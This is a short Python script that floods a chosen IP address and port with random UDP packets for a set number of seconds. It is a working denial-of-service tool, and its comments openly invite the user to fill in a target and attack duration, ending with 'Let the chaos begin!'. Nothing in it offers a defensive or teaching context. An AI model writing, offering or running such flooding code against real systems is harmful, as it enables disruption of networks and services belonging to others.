import socket
import random
import time

def boot_network(target_ip, target_port, duration):
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Set timeout to prevent blocking
    sock.settimeout(0.01)
    
    # Start time
    start_time = time.time()
    
    # Main loop
    while (time.time() - start_time) < duration:
        # Generate a random payload
        payload = random._urandom(1024)
        
        try:
            # Send payload to target
            sock.sendto(payload, (target_ip, target_port))
        except Exception as e:
            print("Error:", e)
    
    # Close the socket
    sock.close()

# Replace these values with your target's IP address, port, and duration of attack
target_ip = "192.168.1.1"
target_port = 80
duration = 60  # Attack duration in seconds

# Let the chaos begin!
boot_network(target_ip, target_port, duration)